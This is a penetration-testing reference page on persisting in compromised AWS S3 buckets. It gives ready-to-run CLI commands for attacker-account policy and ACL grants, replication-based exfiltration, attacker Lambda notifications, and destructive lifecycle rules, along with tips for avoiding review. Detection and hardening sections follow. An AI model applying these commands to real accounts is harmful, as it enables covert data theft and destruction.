---
cstg_id: CSTG-AWS-S3-PERSIST
title: "AWS S3 - Persistence"
provider: aws
service: s3
phase: persistence
required_access: assumed-breach
required_permissions:
  - s3:PutBucketPolicy
  - s3:PutBucketAcl
  - s3:PutBucketNotification
  - s3:PutBucketReplication
  - s3:PutLifecycleConfiguration
  - s3:PutObject
  - s3:PutBucketWebsite
tools: [aws-cli, pacu, cloudfox, stratus-red-team]
references:
  - "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-policy-language-overview.html"
  - "https://docs.aws.amazon.com/AmazonS3/latest/userguide/NotificationHowTo.html"
  - "https://docs.aws.amazon.com/AmazonS3/latest/userguide/replication.html"
  - "https://hackingthe.cloud/aws/post_exploitation/s3_bucket_backdoor/"
license: CC BY-SA 4.0
---

## Summary

Persistence against S3 is the establishment of durable, low-noise access to bucket data (and to the
events buckets generate) that survives credential rotation, role changes, and routine remediation.
Unlike privilege escalation, the goal is not to gain new privilege now but to ensure that access -
or a trigger for code execution and exfiltration - remains available later. S3 offers several
durable footholds: resource-based grants (bucket policy / ACL) that name an external principal and
persist independently of the compromised identity; continuous data exfiltration via cross-region
replication; event-driven backdoors via bucket notifications that fire whenever an object is
written; and silent data destruction via lifecycle expiration. This page assumes a principal already
holds the relevant S3 control permissions (assumed-breach). Gaining those permissions is covered in
[AWS S3 - Privilege Escalation](../03-privilege-escalation/aws-s3-privesc.md); harvesting the data
itself is covered in [AWS S3 - Post-Exploitation](../05-post-exploitation/aws-s3-post-exploitation.md).

## Prerequisites

A principal holding one or more S3 control permissions on a target bucket - `s3:PutBucketPolicy`,
`s3:PutBucketAcl`, `s3:PutBucketNotification`, `s3:PutBucketReplication` (plus an IAM role for
replication), `s3:PutLifecycleConfiguration`, or `s3:PutBucketWebsite`. Some paths also require the
ability to receive the access they grant (an external account ID, or an attacker-controlled
Lambda/SNS/SQS/replica bucket). Confirm effective permissions first (see [Enumeration](#enumeration)).

## Enumeration

Identify which buckets are writable at the control plane and the current configuration that a
backdoor would modify or hide within:

```bash
aws sts get-caller-identity
aws s3api list-buckets --query 'Buckets[].Name' --output text
B=target-bucket
aws s3api get-bucket-policy            --bucket "$B"   # existing statements to append to
aws s3api get-bucket-acl              --bucket "$B"   # ACLs enabled?
aws s3api get-bucket-notification-configuration --bucket "$B"
aws s3api get-bucket-replication      --bucket "$B"
aws s3api get-bucket-lifecycle-configuration    --bucket "$B"
aws s3api get-bucket-versioning       --bucket "$B"   # affects replication + recovery
aws s3api get-bucket-ownership-controls --bucket "$B" # BucketOwnerEnforced disables ACL path
```

## Misconfigurations & Findings

- **Resource policy grants to an external account** - a bucket policy or ACL statement naming an
  attacker-controlled account/canonical ID persists even after the compromised identity is disabled.
- **Replication to an unfamiliar destination** - a replication rule shipping objects to a bucket in
  another account/region provides continuous, automatic exfiltration.
- **Notification target outside the account** - an `s3:ObjectCreated:*` event pointed at an
  attacker-owned Lambda/SNS/SQS turns every upload into a trigger or exfiltration channel.
- **Unexpected lifecycle expiration** - a lifecycle rule that expires current and non-current
  versions destroys data and hampers recovery/forensics.
- **Buckets without versioning / Object Lock** - allow overwrite-based backdoors and silent deletion
  with no recovery path.

## Exploitation

### `s3:PutBucketPolicy` - external-principal resource grant

Append (do not replace, to stay quiet) a statement granting a separate attacker-controlled account
durable read/write, independent of the compromised identity:

```bash
cat > policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
 {"Sid":"AWSLogDeliveryWrite","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<attacker-acct>:root"},
  "Action":["s3:GetObject","s3:PutObject","s3:ListBucket"],
  "Resource":["arn:aws:s3:::<bucket>","arn:aws:s3:::<bucket>/*"]}]}
JSON
aws s3api put-bucket-policy --bucket "$B" --policy file://policy.json
```

A benign-looking `Sid` and use of only the actions needed reduce the chance the statement is noticed
in review. The grant survives rotation of the original credentials because it is bound to the bucket,
not the identity.

### `s3:PutBucketAcl` - cross-account ACL grant

Where ACLs are enabled (Object Ownership is not `BucketOwnerEnforced`), grant an external canonical
ID read/write at the bucket level - an alternative resource-based foothold that some policy-focused
reviews overlook:

```bash
aws s3api put-bucket-acl --bucket "$B" \
  --grant-read   id=<attacker-canonical-id> \
  --grant-write  id=<attacker-canonical-id>
```

### `s3:PutBucketReplication` - continuous exfiltration

Configure cross-region/cross-account replication so every new (and optionally existing) object is
automatically copied to an attacker-controlled destination bucket. Requires versioning on the source
and an IAM role S3 can assume to replicate:

```bash
cat > repl.json <<'JSON'
{"Role":"arn:aws:iam::<victim-acct>:role/<replication-role>",
 "Rules":[{"ID":"backup-sync","Status":"Enabled","Priority":1,
   "Filter":{},"DeleteMarkerReplication":{"Status":"Disabled"},
   "Destination":{"Bucket":"arn:aws:s3:::<attacker-dest-bucket>","Account":"<attacker-acct>",
     "AccessControlTranslation":{"Owner":"Destination"}}}]}
JSON
aws s3api put-bucket-replication --bucket "$B" --replication-configuration file://repl.json
```

This is durable, automatic, and (because replication uses the control plane, not `GetObject`)
invisible to object-level read monitoring.

### `s3:PutBucketNotification` - event-driven backdoor

Register a notification so an attacker-controlled Lambda/SNS/SQS fires on every object create or
delete - usable to trigger code, alert on activity, or stream object metadata out:

```bash
cat > notif.json <<'JSON'
{"LambdaFunctionConfigurations":[{"Id":"audit-hook",
  "LambdaFunctionArn":"arn:aws:lambda:<region>:<attacker-acct>:function:<fn>",
  "Events":["s3:ObjectCreated:*"]}]}
JSON
aws s3api put-bucket-notification-configuration --bucket "$B" --notification-configuration notif.json
```

### `s3:PutObject` - artifact backdoor

In buckets consumed by privileged automation (deployment packages, IaC templates, bootstrap
scripts), plant or overwrite an object so that future executions re-establish access even after the
current foothold is cleaned. See the code-execution paths in
[AWS S3 - Privilege Escalation](../03-privilege-escalation/aws-s3-privesc.md); used for persistence,
the payload is a long-lived re-entry mechanism (e.g. a beacon added to a frequently re-run script).

### `s3:PutBucketWebsite` - served-content foothold

On a bucket fronting a static site, set or alter the website configuration / overwrite assets to
serve attacker-controlled JavaScript, redirecting users or injecting a client-side implant that
persists until the assets are restored:

```bash
aws s3api put-bucket-website --bucket "$B" \
  --website-configuration '{"IndexDocument":{"Suffix":"index.html"}}'
```

### `s3:PutLifecycleConfiguration` - destructive/anti-forensic persistence

A lifecycle rule can quietly expire objects and non-current versions, destroying data or evidence on
a schedule. This is a destructive technique - confirm it is explicitly authorised before use:

```bash
aws s3api put-bucket-lifecycle-configuration --bucket "$B" --lifecycle-configuration \
  '{"Rules":[{"ID":"cleanup","Status":"Enabled","Filter":{"Prefix":""},
     "Expiration":{"Days":1},"NoncurrentVersionExpiration":{"NoncurrentDays":1}}]}'
```

## Detection & Logging

- **Control-plane writes are CloudTrail management events** and should be alerted on for sensitive
  buckets: `PutBucketPolicy`, `PutBucketAcl`, `PutBucketReplication`, `PutBucketNotification`,
  `PutBucketLifecycleConfiguration`, `PutBucketWebsite`. A change to any of these from a non-admin
  principal is high-signal.
- **Resource-policy / ACL grants to external accounts** are detected by **IAM Access Analyzer**,
  which reports buckets sharing access outside the account/zone of trust - review its findings for
  unexpected external principals.
- **Replication and notification configurations** pointing at unfamiliar account IDs, regions, or
  function ARNs are the durable artifacts; periodically diff them against a known-good baseline.
- **Config / Config Rules** (`s3-bucket-public-read/write-prohibited`,
  `s3-bucket-replication-enabled`) and drift detection surface unauthorised configuration changes.
- **Object overwrites/deletes from lifecycle or `PutObject`** are data events - logged only with S3
  data events enabled; lifecycle expirations also emit `s3:LifecycleExpiration` events when
  notifications are configured.
- **GuardDuty** flags anomalous configuration and access patterns; correlate a config change with the
  principal and source IP that made it.

## Remediation & Hardening

- Restrict S3 control permissions (`PutBucketPolicy`, `PutBucketAcl`, `PutBucketReplication`,
  `PutBucketNotification`, `PutLifecycleConfiguration`, `PutBucketWebsite`) to a dedicated admin role
  and **deny them elsewhere via SCP**.
- Enable **IAM Access Analyzer** and alert on any bucket granting access to an external account;
  treat unexpected external principals, replication destinations, and notification targets as
  incidents.
- Set **Object Ownership = Bucket owner enforced** to remove the ACL grant path entirely.
- Enforce **Block Public Access** account-wide so policy/website backdoors cannot expose data
  publicly.
- Enable **versioning + Object Lock (compliance mode)** and **MFA Delete** on critical buckets so
  artifact overwrites and lifecycle deletions are recoverable and tamper-resistant.
- Baseline and **continuously diff** bucket policy, replication, notification, lifecycle, and website
  configuration via AWS Config; alert on drift.
- Enable **CloudTrail management events** with alerting on the `PutBucket*` API family for sensitive
  buckets, and **S3 data events** to catch artifact overwrites.

## Tools

- **aws-cli** - apply and verify each persistence configuration.
- **Pacu** - `s3__*` modules automate several backdoor paths (active and intrusive - requires
  explicit rules of engagement).
- **CloudFox** - identifies writable buckets and external-trust exposure from the current principal.
- **Stratus Red Team** - emulates S3 persistence/exfiltration techniques for detection validation.

## References

- AWS - Bucket policy / access policy language overview
- AWS - Configuring S3 event notifications
- AWS - Replicating objects (S3 replication)
- hackingthe.cloud - S3 bucket backdoor / persistence
